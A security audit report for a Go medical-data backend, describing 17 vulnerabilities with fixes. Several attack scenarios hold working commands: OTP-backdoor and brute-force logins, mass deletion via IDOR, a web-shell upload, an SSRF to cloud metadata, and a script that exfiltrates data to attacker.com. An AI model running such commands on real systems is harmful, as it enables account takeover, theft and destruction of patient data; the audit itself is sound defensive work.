# Security Audit Report
## FamCan Risk Assessment Backend - Go Application

**Audit Date:** December 24, 2025  
**Auditors:** Armin Delgosar, Ali Rasouli 
**Application:** Golang Backend API  
**Framework:** Gin + GORM + PostgreSQL + Redis

---

## Executive Summary

This comprehensive security audit identified **17 security vulnerabilities** across the application, including **4 Critical**, **5 High**, **5 Medium**, and **3 Low** severity issues. The most severe findings include:

1. **Hardcoded OTP backdoor** allowing complete authentication bypass
2. **Broken access control** enabling any user to delete all forms
3. **Secrets embedded in Docker image** exposing production credentials
4. **Rate limiting completely disabled** enabling brute-force attacks

**Immediate action is required** to address Critical and High severity issues before production deployment.

---

## Critical Severity Findings

### CRIT-01: Authentication Bypass via Hardcoded OTP Backdoor

| Attribute | Value |
|-----------|-------|
| **File** | `internal/application/service/otp_service_impl.go` |
| **Lines** | 46-48 |
| **CVSS Score** | 9.8 (Critical) |
| **CWE** | CWE-798: Use of Hard-coded Credentials |

#### Vulnerable Code

```go
func (otpService *OTPService) VerifyOTP(redisKey, otp string) error {
    // Backdoor for development/testing
    if otp == "111111" {
        return nil
    }
    // ... rest of verification
}
```

#### Description

A hardcoded OTP value `111111` bypasses all OTP verification. Any attacker who discovers this can authenticate as any user in the system without access to their phone.

#### Attack Scenario

```bash
# Step 1: Request OTP for victim's phone number
curl -X POST https://api.example.com/auth/login \
  -H "Content-Type: application/json" \
  -d '{"phone": "09123456789"}'

# Step 2: Bypass OTP with hardcoded value (victim's real OTP is ignored)
curl -X POST https://api.example.com/auth/verify-otp \
  -H "Content-Type: application/json" \
  -d '{"phone": "09123456789", "otp": "111111"}'

# Response: JWT tokens for victim's account
```

#### Impact

- Complete authentication bypass for any user account
- Full access to victim's medical records and personal health information (PHI)
- Ability to modify or delete victim's data
- HIPAA/GDPR compliance violation

#### Remediation

**Remove the backdoor code entirely:**

```go
func (otpService *OTPService) VerifyOTP(redisKey, otp string) error {
    // REMOVED: Backdoor for development/testing
    // if otp == "111111" {
    //     return nil
    // }

    var validationErrors exception.ValidationErrors
    redisValue, err := otpService.userCacheRepository.Get(context.Background(), redisKey)
    // ... continue with proper verification
}
```

**For development/testing environments:**
- Use environment variable to enable test mode: `if os.Getenv("ENABLE_TEST_OTP") == "true"`
- Never deploy with test mode enabled
- Add CI/CD check to block deployment if test mode is detected

---

### CRIT-02: Broken Access Control - IDOR on Form Deletion

| Attribute | Value |
|-----------|-------|
| **File** | `internal/application/service/form_service_impl.go` |
| **Lines** | 2307-2328 |
| **CVSS Score** | 9.1 (Critical) |
| **CWE** | CWE-639: Authorization Bypass Through User-Controlled Key |

#### Vulnerable Code

```go
func (formService *FormService) DeleteForm(request formdto.DeleteFormRequest) error {
    form, err := formService.formRepository.FindFormByID(formService.db, request.FormID)
    if err != nil {
        return err
    }
    if form == nil {
        notFoundError := exception.NotFoundError{Item: formService.constants.Field.Form}
        return notFoundError
    }

    // VULNERABILITY: Authorization check is commented out!
    // if form.UserID != request.UserID {
    //     ForbiddenError := exception.ForbiddenError{Message: formService.constants.Field.Form}
    //     return ForbiddenError
    // }

    err = formService.formRepository.DeleteForm(formService.db, request.FormID)
    if err != nil {
        return err
    }
    return nil
}
```

#### Description

The authorization check that verifies form ownership is commented out. Any authenticated user can delete any form in the system by simply providing the form ID.

#### Attack Scenario

```bash
# Attacker enumerates and deletes all forms in the system
for formID in $(seq 1 10000); do
  curl -X DELETE "https://api.example.com/customer/form/$formID" \
    -H "Authorization: Bearer $ATTACKER_JWT_TOKEN"
  echo "Deleted form $formID"
done
```

#### Impact

- Complete destruction of all patient medical records
- HIPAA/GDPR violation for unauthorized data deletion
- Business continuity impact - data loss
- Potential legal liability

#### Remediation

**Uncomment and enhance the authorization check:**

```go
func (formService *FormService) DeleteForm(request formdto.DeleteFormRequest) error {
    form, err := formService.formRepository.FindFormByID(formService.db, request.FormID)
    if err != nil {
        return err
    }
    if form == nil {
        return exception.NotFoundError{Item: formService.constants.Field.Form}
    }

    // FIXED: Proper authorization check
    // Check if user is SuperAdmin (can delete any form)
    isSuperAdminUser, err := formService.isSuperAdmin(request.UserID)
    if err != nil {
        return err
    }
    
    if !isSuperAdminUser {
        // Check if user is the form owner
        if form.UserID != request.UserID {
            return exception.ForbiddenError{Resource: formService.constants.Field.Form}
        }
    }

    err = formService.formRepository.DeleteForm(formService.db, request.FormID)
    if err != nil {
        return err
    }

    return nil
}
```

---

### CRIT-03: Secrets Embedded in Docker Production Image

| Attribute | Value |
|-----------|-------|
| **File** | `Dockerfile` |
| **Line** | 30 |
| **CVSS Score** | 9.0 (Critical) |
| **CWE** | CWE-312: Cleartext Storage of Sensitive Information |

#### Vulnerable Code

```dockerfile
FROM alpine:3.19

RUN apk add --no-cache ca-certificates tzdata

WORKDIR /app

COPY --from=builder /app/main .
RUN mkdir -p /app/internal/infrastructure/jwt
COPY ../internal/infrastructure/jwt/privateKey.pem ./internal/infrastructure/jwt/
COPY ../internal/infrastructure/jwt/publicKey.pem ./internal/infrastructure/jwt/

COPY ../.env .  # <-- VULNERABILITY: Secrets copied into image

EXPOSE 8080

CMD ["./main"]
```

#### Description

The `.env` file containing all production secrets is copied directly into the Docker image. Anyone with access to the container registry or ability to pull the image can extract all credentials.

#### Secrets Exposed

Based on `bootstrap/env.go`, the following secrets are exposed:

| Secret | Impact |
|--------|--------|
| `DB_PASSWORD` | Full database access |
| `S3_SECRET_KEY` | Access to all S3 buckets with medical images |
| `ENCRYPTION_KEY` | Ability to decrypt all encrypted PHI (SSN, addresses) |
| `SUPER_ADMIN_PASSWORD` | Super admin account access |
| `SMS_API_KEY` | Ability to send SMS as the application |
| `JWT Private Key` | Ability to forge any JWT token |

#### Attack Scenario

```bash
# Attacker with registry access extracts secrets
docker pull ghcr.io/famcan-riskassessment/backend:latest
docker run --rm ghcr.io/famcan-riskassessment/backend cat /app/.env

# Or from a running container
docker exec -it backend-RA cat /app/.env

# Output reveals all production credentials
```

#### Impact

- Complete compromise of all production systems
- Ability to access, modify, and delete all data
- Ability to decrypt all encrypted patient data
- Ability to impersonate any user including super admin

#### Remediation

**1. Remove `.env` from Dockerfile:**

```dockerfile
FROM alpine:3.19

RUN apk add --no-cache ca-certificates tzdata

WORKDIR /app

COPY --from=builder /app/main .
RUN mkdir -p /app/internal/infrastructure/jwt
# JWT keys should also be mounted at runtime, not copied
# COPY ./internal/infrastructure/jwt/privateKey.pem ./internal/infrastructure/jwt/

EXPOSE 8080

CMD ["./main"]
```

**2. Use runtime environment variables:**

```yaml
# docker-compose.yaml
services:
  backend:
    image: ghcr.io/famcan-riskassessment/backend:latest
    environment:
      - DB_PASSWORD=${DB_PASSWORD}
      - S3_SECRET_KEY=${S3_SECRET_KEY}
      - ENCRYPTION_KEY=${ENCRYPTION_KEY}
    # Or use Docker secrets
    secrets:
      - db_password
      - s3_secret_key

secrets:
  db_password:
    external: true
  s3_secret_key:
    external: true
```

**3. For Kubernetes, use Secrets:**

```yaml
apiVersion: v1
kind: Secret
metadata:
  name: backend-secrets
type: Opaque
data:
  DB_PASSWORD: <base64-encoded>
  ENCRYPTION_KEY: <base64-encoded>
```

**4. Add `.env` to `.dockerignore`:**

```
.env
*.pem
```

---

### CRIT-04: Rate Limiting Completely Disabled

| Attribute | Value |
|-----------|-------|
| **File** | `internal/presentation/middleware/rate_limit.go` |
| **Lines** | 41-49 |
| **CVSS Score** | 8.6 (High/Critical) |
| **CWE** | CWE-770: Allocation of Resources Without Limits |

#### Vulnerable Code

```go
func (rlm *RateLimitMiddleware) RateLimit() gin.HandlerFunc {
    return func(c *gin.Context) {
        ip := c.ClientIP()

        _, err := rlm.rateLimiter.Allow(context.Background(), ip)
        if err != nil {
            c.Next()
            return
        }

        // REMOVE RATE LIMIT IN TESTING PHASE
        // if !allowed {
        //     rateLimitErr := exception.NewRequestRateLimitError(
        //         "Too many requests from this IP",
        //         rlm.security.RateLimitPerMinute,
        //         nil,
        //     )
        //     panic(rateLimitErr)
        // }

        c.Next()  // Always allows request through
    }
}
```

#### Description

The rate limiting enforcement logic is completely commented out. The middleware checks if a request is allowed but never blocks requests that exceed the limit.

#### Attack Scenarios

**1. OTP Brute Force:**
```bash
# 6-digit OTP = 999,999 combinations
# Without rate limiting, brute-force in minutes
for otp in $(seq -w 000001 999999); do
  response=$(curl -s -X POST https://api.example.com/auth/verify-otp \
    -d "{\"phone\": \"09123456789\", \"otp\": \"$otp\"}")
  if [[ $response == *"token"* ]]; then
    echo "Found OTP: $otp"
    break
  fi
done
```

**2. Credential Stuffing:**
```bash
# Test leaked credentials against the system
while read phone; do
  curl -X POST https://api.example.com/auth/login -d "{\"phone\": \"$phone\"}"
done < leaked_phones.txt
```

**3. Application DoS:**
```bash
# Flood the server with requests
ab -n 100000 -c 1000 https://api.example.com/
```

#### Impact

- OTP can be brute-forced in minutes (6 digits = ~1M combinations)
- Credential stuffing attacks undetected
- Denial of Service through resource exhaustion
- Server costs spike from abuse

#### Remediation

**Uncomment the rate limiting logic:**

```go
func (rlm *RateLimitMiddleware) RateLimit() gin.HandlerFunc {
    return func(c *gin.Context) {
        ip := c.ClientIP()

        allowed, err := rlm.rateLimiter.Allow(context.Background(), ip)
        if err != nil {
            // FIXED: Fail-closed instead of fail-open
            log.Printf("Rate limiter error: %v", err)
            rateLimitErr := exception.NewRequestRateLimitError(
                "Service temporarily unavailable",
                0,
                err,
            )
            panic(rateLimitErr)
        }

        // FIXED: Enforce rate limiting
        if !allowed {
            rateLimitErr := exception.NewRequestRateLimitError(
                "Too many requests from this IP",
                rlm.security.RateLimitPerMinute,
                nil,
            )
            panic(rateLimitErr)
        }

        c.Next()
    }
}
```

---

## High Severity Findings

### HIGH-01: HTTP Client Without Timeout - SSRF & DoS Risk

| Attribute | Value |
|-----------|-------|
| **File** | `internal/application/service/calc_service_impl.go` |
| **Lines** | 633, 711, 789, 1144 |
| **CVSS Score** | 7.5 (High) |
| **CWE** | CWE-400: Uncontrolled Resource Consumption |

#### Vulnerable Code

```go
// Multiple instances throughout the file:
resp, err := http.DefaultClient.Do(req)
```

#### Description

The application uses `http.DefaultClient` which has no timeout configured. If external calculation APIs (PREMM5, BCRA, Gail, PLCO) become slow or unresponsive, goroutines will hang indefinitely, eventually exhausting server resources.

#### Attack Scenarios

**1. Slow Loris DoS via DNS Manipulation:**
```bash
# If attacker controls DNS or the calc API endpoint
# They can make requests hang indefinitely
# Server accumulates hanging goroutines → OOM → crash
```

**2. SSRF if URL is Controllable:**
```bash
# If PREMM5_API_URL can be influenced:
export PREMM5_API_URL="http://169.254.169.254/latest/meta-data/"
# Application makes request to AWS metadata service
```

#### Impact

- Denial of Service through resource exhaustion
- Potential SSRF to internal services
- Memory exhaustion leading to server crash

#### Remediation

**Create a custom HTTP client with timeout:**

```go
// Create once, reuse across requests
var calcHTTPClient = &http.Client{
    Timeout: 30 * time.Second,
    Transport: &http.Transport{
        DialContext: (&net.Dialer{
            Timeout:   10 * time.Second,
            KeepAlive: 30 * time.Second,
        }).DialContext,
        TLSHandshakeTimeout:   10 * time.Second,
        ResponseHeaderTimeout: 20 * time.Second,
        IdleConnTimeout:       90 * time.Second,
        MaxIdleConns:          100,
        MaxIdleConnsPerHost:   10,
    },
}

// Use in API calls:
resp, err := calcHTTPClient.Do(req)
if err != nil {
    if os.IsTimeout(err) {
        return calcdto.ModelResponse{}, &exception.CalcError{
            Type:    exception.ErrorTypeTimeout,
            Model:   "PREMM5",
            Message: "calculation API timed out",
            OrigErr: err,
        }
    }
    return calcdto.ModelResponse{}, err
}
```

---

### HIGH-02: Database Connection Without SSL/TLS

| Attribute | Value |
|-----------|-------|
| **File** | `internal/infrastructure/database/postgres.go` |
| **Line** | 35 |
| **CVSS Score** | 7.4 (High) |
| **CWE** | CWE-319: Cleartext Transmission of Sensitive Information |

#### Vulnerable Code

```go
dsn := fmt.Sprintf(
    "host=%s port=%s user=%s password=%s dbname=%s sslmode=disable TimeZone=UTC",
    dbConfig.Host,
    dbConfig.Port,
    dbConfig.User,
    dbConfig.Password,
    dbConfig.Name,
)
```

#### Description

Database connections are established without SSL/TLS encryption. All data transmitted between the application and database, including credentials and patient data, is sent in plaintext.

#### Attack Scenario

```bash
# Attacker on the same network segment captures traffic
tcpdump -i eth0 -A port 5432

# Captures:
# - Database credentials
# - All SQL queries with patient data
# - SSN, medical records, contact information
```

#### Impact

- Database credentials exposed on network
- All patient data (PHI) exposed in transit
- HIPAA/GDPR compliance violation
- Man-in-the-middle attacks possible

#### Remediation

**Enable SSL for PostgreSQL connection:**

```go
dsn := fmt.Sprintf(
    "host=%s port=%s user=%s password=%s dbname=%s sslmode=require TimeZone=UTC",
    dbConfig.Host,
    dbConfig.Port,
    dbConfig.User,
    dbConfig.Password,
    dbConfig.Name,
)

// For mutual TLS (more secure):
dsn := fmt.Sprintf(
    "host=%s port=%s user=%s password=%s dbname=%s sslmode=verify-full sslcert=%s sslkey=%s sslrootcert=%s TimeZone=UTC",
    dbConfig.Host,
    dbConfig.Port,
    dbConfig.User,
    dbConfig.Password,
    dbConfig.Name,
    "/path/to/client-cert.pem",
    "/path/to/client-key.pem",
    "/path/to/ca-cert.pem",
)
```

**Configure PostgreSQL server for SSL:**
```bash
# postgresql.conf
ssl = on
ssl_cert_file = '/path/to/server.crt'
ssl_key_file = '/path/to/server.key'
ssl_ca_file = '/path/to/ca.crt'
```

---

### HIGH-03: Wildcard CORS Policy

| Attribute | Value |
|-----------|-------|
| **File** | `internal/presentation/middleware/cors.go` |
| **Line** | ~24 |
| **CVSS Score** | 6.5 (Medium/High) |
| **CWE** | CWE-942: Permissive Cross-domain Policy |

#### Vulnerable Code

```go
corsConfig := cors.Config{
    // TODO: Security Enhancement - Restrict CORS to specific origins
    // Currently allows all origins (*) which is a security risk in production
    AllowOrigins:  []string{"*"},
    AllowMethods:  []string{"POST", "GET", "OPTIONS", "PUT", "PATCH", "DELETE"},
    AllowHeaders:  []string{"Origin", "Content-Type", "Authorization", "ngrok-skip-browser-warning"},
    ExposeHeaders: []string{"Content-Length"},
    MaxAge:        12 * time.Hour,
}
```

#### Description

CORS is configured to allow requests from any origin (`*`). This enables malicious websites to make authenticated requests to the API if they can obtain a user's token.

#### Attack Scenario

```html
<!-- Attacker's malicious website: evil.com -->
<script>
  // If attacker has stolen token from XSS or other means
  const stolenToken = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...";
  
  fetch('https://api.example.com/admin/users', {
    method: 'GET',
    headers: {
      'Authorization': `Bearer ${stolenToken}`
    }
  })
  .then(response => response.json())
  .then(data => {
    // Exfiltrate data to attacker's server
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
</script>
```

#### Impact

- Cross-origin data theft when combined with XSS or token theft
- API abuse from malicious third-party websites
- Potential for CSRF-like attacks

#### Remediation

**Restrict CORS to specific trusted origins:**

```go
corsConfig := cors.Config{
    AllowOrigins: []string{
        "https://app.famcan.com",
        "https://admin.famcan.com",
    },
    AllowMethods:     []string{"POST", "GET", "OPTIONS", "PUT", "PATCH", "DELETE"},
    AllowHeaders:     []string{"Origin", "Content-Type", "Authorization"},
    ExposeHeaders:    []string{"Content-Length"},
    AllowCredentials: true,
    MaxAge:           12 * time.Hour,
}

// For development, use environment variable:
if os.Getenv("SERVER_MODE") == "development" {
    corsConfig.AllowOrigins = append(corsConfig.AllowOrigins, "http://localhost:3000")
}
```

---

### HIGH-04: Weak File Upload Validation

| Attribute | Value |
|-----------|-------|
| **File** | `internal/domain/validation/upload.go` |
| **Lines** | 68-74 |
| **CVSS Score** | 7.2 (High) |
| **CWE** | CWE-434: Unrestricted Upload of File with Dangerous Type |

#### Vulnerable Code

```go
// Check MIME type from content type header
contentType := file.Header.Get("Content-Type")
if contentType != "" && !AllowedImageMimeTypes[contentType] {
    return exception.FileValidationError{
        Message: fmt.Sprintf("file MIME type '%s' is not allowed", contentType),
    }
}
```

#### Description

File validation relies on the `Content-Type` header provided by the client, which can be easily spoofed. An attacker can upload malicious files (PHP, EXE, etc.) with a fake `image/jpeg` Content-Type.

#### Attack Scenario

```bash
# Upload malicious PHP file disguised as JPEG
curl -X POST "https://api.example.com/customer/form/1/cancer" \
  -H "Authorization: Bearer $TOKEN" \
  -F "cancerType=1" \
  -F "cancerAge=30" \
  -F "pictures=@shell.php;type=image/jpeg;filename=innocent.jpg"

# If S3 serves files directly or through misconfigured proxy:
curl https://s3.example.com/cancer-bucket/shell.php
# Remote code execution achieved
```

#### Impact

- Malicious file upload to S3
- Potential remote code execution if files are served/executed
- Storage of malware on company infrastructure
- Cross-site scripting via SVG uploads

#### Remediation

**Validate file content using magic bytes:**

```go
func ValidateImageFile(file *multipart.FileHeader) error {
    if file == nil {
        return exception.FileValidationError{Message: "file is nil"}
    }

    // Check file size
    if file.Size > MaxImageSize {
        return exception.FileValidationError{
            Message: fmt.Sprintf("file size exceeds %d bytes", MaxImageSize),
        }
    }

    // Open file to read magic bytes
    f, err := file.Open()
    if err != nil {
        return exception.FileValidationError{Message: "failed to open file"}
    }
    defer f.Close()

    // Read first 512 bytes for content detection
    buffer := make([]byte, 512)
    n, err := f.Read(buffer)
    if err != nil && err != io.EOF {
        return exception.FileValidationError{Message: "failed to read file"}
    }

    // Detect actual MIME type from content
    detectedType := http.DetectContentType(buffer[:n])
    if !AllowedImageMimeTypes[detectedType] {
        return exception.FileValidationError{
            Message: fmt.Sprintf("detected MIME type '%s' is not allowed", detectedType),
        }
    }

    // Validate file extension matches content
    ext := strings.ToLower(filepath.Ext(file.Filename))
    expectedExts := mimeToExtension[detectedType]
    if !contains(expectedExts, ext) {
        return exception.FileValidationError{
            Message: "file extension does not match content type",
        }
    }

    // Reset file pointer for subsequent reads
    f.Seek(0, 0)

    return nil
}

var mimeToExtension = map[string][]string{
    "image/jpeg": {".jpg", ".jpeg"},
    "image/png":  {".png"},
    "image/gif":  {".gif"},
    "image/webp": {".webp"},
}
```

---

### HIGH-05: Exposed Database Ports in Docker Compose

| Attribute | Value |
|-----------|-------|
| **File** | `docker-compose.yaml` |
| **Lines** | 33, 54 |
| **CVSS Score** | 6.5 (Medium/High) |
| **CWE** | CWE-284: Improper Access Control |

#### Vulnerable Code

```yaml
db:
  ports:
    - ${DB_PORT}:5432   # PostgreSQL exposed to host

rdb:
  ports:
    - ${RDB_PORT}:6379  # Redis exposed to host
```

#### Description

Database and Redis ports are mapped to the host. If the host firewall is misconfigured or the server is on a public network, these services become directly accessible.

#### Attack Scenario

```bash
# Attacker scans for open PostgreSQL ports
nmap -p 5432 target.example.com

# If port is open, connect directly
psql -h target.example.com -U famcan_user -d famcan_db
# Bypasses all application-level security
```

#### Impact

- Direct database access bypassing application security
- Data theft, modification, or deletion
- Redis cache poisoning or data theft

#### Remediation

**Remove external port mappings for databases:**

```yaml
services:
  backend:
    # ... backend config
    networks:
      - famcan-network

  db:
    image: postgres:17
    container_name: db-RA
    # REMOVED: ports mapping
    # ports:
    #   - ${DB_PORT}:5432
    networks:
      - famcan-network

  rdb:
    image: redis:8
    container_name: rdb-RA
    # REMOVED: ports mapping
    # ports:
    #   - ${RDB_PORT}:6379
    networks:
      - famcan-network

networks:
  famcan-network:
    internal: true  # Network not accessible from host
```

---

## Medium Severity Findings

### MED-01: Sensitive Data in Application Logs

| Attribute | Value |
|-----------|-------|
| **File** | `internal/presentation/middleware/auth.go` |
| **Line** | 75 |
| **CVSS Score** | 5.3 (Medium) |
| **CWE** | CWE-532: Information Exposure Through Log Files |

#### Vulnerable Code

```go
user, _ := am.userRepository.FindUserByID(am.db, id.(uint))
fmt.Println("user sending this req: ", user.ID)
```

#### Also Found In

- `internal/application/service/calc_service_impl.go` - Logs medical data parameters

#### Description

Debug logging statements print sensitive information (user IDs, medical data) to stdout. In containerized environments, these logs are often aggregated to central logging systems accessible by multiple team members.

#### Impact

- User IDs exposed in logs
- Medical data parameters visible to anyone with log access
- Potential HIPAA violation

#### Remediation

```go
// Remove debug logging in production
// Or use structured logging with sensitive data redaction:

import "github.com/sirupsen/logrus"

log := logrus.WithFields(logrus.Fields{
    "user_id": "[REDACTED]",
    "action":  "form_calculation",
})
log.Info("Processing calculation request")
```

---

### MED-02: Hardcoded Passwords in Seed Data

| Attribute | Value |
|-----------|-------|
| **File** | `internal/infrastructure/seed/dummy.go` |
| **Line** | 87 |
| **CVSS Score** | 5.0 (Medium) |
| **CWE** | CWE-798: Use of Hard-coded Credentials |

#### Vulnerable Code

```go
user := &entity.User{
    Phone:    userData.phone,
    Password: "123456",  // Hardcoded password
}
```

#### Description

Dummy seed data uses a hardcoded weak password for all test users. If this seeder accidentally runs in production or test data is exposed, attackers have valid credentials.

#### Impact

- Weak, predictable passwords for test accounts
- If seeder runs in production, creates vulnerable accounts

#### Remediation

```go
// Use bcrypt hashing even for seed data
hashedPassword, _ := passwordHasher.Hash("randomGeneratedPassword")
user := &entity.User{
    Phone:    userData.phone,
    Password: hashedPassword,
}

// Better: Skip seeding in production
func (d *DummySeeder) SeedDummy() {
    if os.Getenv("SERVER_MODE") == "production" {
        log.Warn("Skipping dummy seeder in production")
        return
    }
    d.seedUsers()
    d.seedForms()
}
```

---

### MED-03: Fail-Open Rate Limiting

| Attribute | Value |
|-----------|-------|
| **File** | `internal/presentation/middleware/rate_limit.go` |
| **Lines** | 34-39 |
| **CVSS Score** | 5.3 (Medium) |
| **CWE** | CWE-636: Not Failing Securely |

#### Vulnerable Code

```go
_, err := rlm.rateLimiter.Allow(context.Background(), ip)
if err != nil {
    // Log error but don't block request on Redis failure
    // This is a fail-open approach
    c.Next()
    return
}
```

#### Description

When Redis fails (connection error, timeout), the rate limiter allows all requests through. An attacker could DoS the Redis server to disable rate limiting entirely.

#### Impact

- Rate limiting bypassed when Redis is unavailable
- Attacker can cause Redis failure to disable protection

#### Remediation

```go
_, err := rlm.rateLimiter.Allow(context.Background(), ip)
if err != nil {
    log.Errorf("Rate limiter Redis error: %v", err)
    
    // Option 1: Fail-closed (more secure)
    c.AbortWithStatusJSON(503, gin.H{"error": "Service temporarily unavailable"})
    return
    
    // Option 2: In-memory fallback rate limiter
    // if !inMemoryLimiter.Allow(ip) {
    //     c.AbortWithStatusJSON(429, gin.H{"error": "Too many requests"})
    //     return
    // }
}
```

---

### MED-04: Encryption Fallback Returns Plaintext

| Attribute | Value |
|-----------|-------|
| **File** | `internal/infrastructure/crypto/field_encryptor.go` |
| **Lines** | 62-64, 79-80, 86-87 |
| **CVSS Score** | 5.0 (Medium) |
| **CWE** | CWE-311: Missing Encryption of Sensitive Data |

#### Vulnerable Code

```go
func (fe *FieldEncryptor) Decrypt(ciphertext string) (string, error) {
    // ...
    data, err := base64.StdEncoding.DecodeString(ciphertext)
    if err != nil {
        // Not valid base64 - assume it's plaintext
        return ciphertext, nil  // Returns input unchanged
    }
    // ...
    if len(data) < nonceSize {
        return ciphertext, nil  // Returns input unchanged
    }
    // ...
    plaintext, err := gcm.Open(nil, nonce, ciphertextBytes, nil)
    if err != nil {
        return ciphertext, nil  // Returns input unchanged on decryption failure
    }
}
```

#### Description

The decryption function silently returns the input unchanged when decryption fails, treating it as plaintext. This "backwards compatibility" feature could mask encryption failures or allow attackers to store plaintext data that bypasses encryption.

#### Impact

- Encryption failures go undetected
- Plaintext data could be stored and returned without encryption
- Difficult to audit if data is actually encrypted

#### Remediation

```go
func (fe *FieldEncryptor) Decrypt(ciphertext string) (string, error) {
    if ciphertext == "" {
        return "", nil
    }

    data, err := base64.StdEncoding.DecodeString(ciphertext)
    if err != nil {
        // Log for migration tracking, but return error
        log.Warnf("Decryption: non-base64 data encountered, may need migration")
        return "", fmt.Errorf("invalid ciphertext format: %w", err)
    }

    // ... decryption logic ...

    if len(data) < nonceSize {
        return "", fmt.Errorf("ciphertext too short")
    }

    plaintext, err := gcm.Open(nil, nonce, ciphertextBytes, nil)
    if err != nil {
        return "", fmt.Errorf("decryption failed: %w", err)
    }

    return string(plaintext), nil
}

// For migration, create a separate function:
func (fe *FieldEncryptor) DecryptOrMigrate(ciphertext string) (string, bool, error) {
    plaintext, err := fe.Decrypt(ciphertext)
    if err != nil {
        // Could be plaintext from before encryption was enabled
        return ciphertext, true, nil  // needsMigration = true
    }
    return plaintext, false, nil
}
```

---

### MED-05: Missing SuperAdmin Check in CreateFamilyCancer

| Attribute | Value |
|-----------|-------|
| **File** | `internal/application/service/form_service_impl.go` |
| **Lines** | 907-933 |
| **CVSS Score** | 4.3 (Medium) |
| **CWE** | CWE-863: Incorrect Authorization |

#### Vulnerable Code

```go
func (formService *FormService) CreateFamilyCancer(request formdto.CreateFamilyCancerRequest) (formdto.CreateFamilyCancerResponse, error) {
    form, err := formService.formRepository.FindFormByID(formService.db, request.FormID)
    // ...
    
    // Missing: isSuperAdminUser check that exists in other methods
    
    isOp, err := formService.isOperator(request.UserID)
    if err != nil {
        return formdto.CreateFamilyCancerResponse{}, err
    }
    if isOp {
        canEdit, err := formService.canOperatorEditForm(form, request.UserID)
        // ...
    } else if form.UserID != request.UserID {
        forbiddenError := exception.ForbiddenError{Resource: formService.constants.Field.Form}
        return formdto.CreateFamilyCancerResponse{}, forbiddenError
    }
    // ...
}
```

#### Description

Unlike other form modification methods (`UpsertGeneralHealth`, `UpdateCancer`, etc.), `CreateFamilyCancer` does not check if the user is a SuperAdmin before checking operator/owner permissions. This creates inconsistent authorization logic.

#### Impact

- SuperAdmins may be incorrectly denied access
- Inconsistent security model across endpoints

#### Remediation

```go
func (formService *FormService) CreateFamilyCancer(request formdto.CreateFamilyCancerRequest) (formdto.CreateFamilyCancerResponse, error) {
    form, err := formService.formRepository.FindFormByID(formService.db, request.FormID)
    // ...

    // ADDED: SuperAdmin check for consistency
    isSuperAdminUser, err := formService.isSuperAdmin(request.UserID)
    if err != nil {
        return formdto.CreateFamilyCancerResponse{}, err
    }
    
    var isOp bool
    if !isSuperAdminUser {
        isOp, err = formService.isOperator(request.UserID)
        // ... rest of authorization logic
    }
    // ...
}
```

---

## Low Severity Findings

### LOW-01: Unsafe Type Assertion in Auth Middleware

| Attribute | Value |
|-----------|-------|
| **File** | `internal/presentation/middleware/auth.go` |
| **Line** | 62 |
| **CVSS Score** | 3.7 (Low) |
| **CWE** | CWE-704: Incorrect Type Conversion |

#### Vulnerable Code

```go
ctx.Set(am.constants.Context.ID, uint(claims["sub"].(float64)))
```

#### Description

Direct type assertion without checking if the assertion is valid. If the JWT `sub` claim is missing, malformed, or of unexpected type, this will cause a panic.

#### Impact

- Application panic on malformed JWT
- Potential DoS by sending crafted tokens

#### Remediation

```go
subClaim, ok := claims["sub"].(float64)
if !ok {
    panic(exception.NewUnauthorizedError("invalid token: missing or invalid sub claim", nil))
}
ctx.Set(am.constants.Context.ID, uint(subClaim))
```

---

### LOW-02: Ignored Error in Auth Middleware

| Attribute | Value |
|-----------|-------|
| **File** | `internal/presentation/middleware/auth.go` |
| **Line** | 74 |
| **CVSS Score** | 3.1 (Low) |
| **CWE** | CWE-754: Improper Check for Exceptional Conditions |

#### Vulnerable Code

```go
user, _ := am.userRepository.FindUserByID(am.db, id.(uint))
fmt.Println("user sending this req: ", user.ID)
```

#### Description

The error from `FindUserByID` is discarded. If the database query fails, `user` will be nil, and accessing `user.ID` on line 75 will cause a panic.

#### Impact

- Application crash on database errors
- Difficult to debug database issues

#### Remediation

```go
user, err := am.userRepository.FindUserByID(am.db, id.(uint))
if err != nil {
    panic(exception.NewUnauthorizedError("failed to fetch user", err))
}
if user == nil {
    panic(exception.NewUnauthorizedError("user not found", nil))
}
```

---

### LOW-03: JWT Private Keys Potentially Committed to Repository

| Attribute | Value |
|-----------|-------|
| **File** | `bootstrap/constants.go`, `Dockerfile` |
| **CVSS Score** | 4.0 (Low/Medium) |
| **CWE** | CWE-321: Use of Hard-coded Cryptographic Key |

#### Evidence

```go
// bootstrap/constants.go
JWTKeysPath: JWTKeysPath{
    PrivateKey: "internal/infrastructure/jwt/privateKey.pem",
    PublicKey:  "internal/infrastructure/jwt/publicKey.pem",
},

// Dockerfile
COPY ./internal/infrastructure/jwt/privateKey.pem ./internal/infrastructure/jwt/
```

#### Description

JWT private keys appear to be stored in the repository at fixed paths and copied into Docker images. If these keys are committed to version control, anyone with repository access can forge valid JWT tokens.

#### Impact

- Ability to forge JWT tokens for any user
- Complete authentication bypass

#### Remediation

1. Add to `.gitignore`:
   ```
   *.pem
   internal/infrastructure/jwt/
   ```

2. Generate keys at deployment time or inject via secrets

3. Use environment variables for key paths:
   ```go
   JWTKeysPath: JWTKeysPath{
       PrivateKey: os.Getenv("JWT_PRIVATE_KEY_PATH"),
       PublicKey:  os.Getenv("JWT_PUBLIC_KEY_PATH"),
   },
   ```

---

## Attack Chain Scenarios

### Scenario 1: Complete System Compromise

**Attacker Goal:** Full access to all patient data

**Attack Steps:**

1. **Discovery:** Find any valid phone number (public directories, data leaks)
2. **Authentication Bypass:** Use OTP backdoor `111111` to authenticate as any user
3. **Privilege Escalation:** If `.env` is exposed (Docker image), obtain `SUPER_ADMIN_PHONE` and authenticate as super admin
4. **Data Exfiltration:** Call `/admin/forms` with no rate limiting to dump all patient data
5. **Covering Tracks:** Delete forms via IDOR vulnerability

```bash
# Step 1: Authenticate as victim
curl -X POST https://api.example.com/auth/login \
  -d '{"phone": "09123456789"}'

# Step 2: Bypass OTP
curl -X POST https://api.example.com/auth/verify-otp \
  -d '{"phone": "09123456789", "otp": "111111"}'

# Step 3: Extract all data (no rate limit)
curl https://api.example.com/admin/forms?pageSize=10000 \
  -H "Authorization: Bearer $SUPER_ADMIN_TOKEN"

# Step 4: Destroy evidence
for i in $(seq 1 10000); do
  curl -X DELETE https://api.example.com/customer/form/$i \
    -H "Authorization: Bearer $TOKEN"
done
```

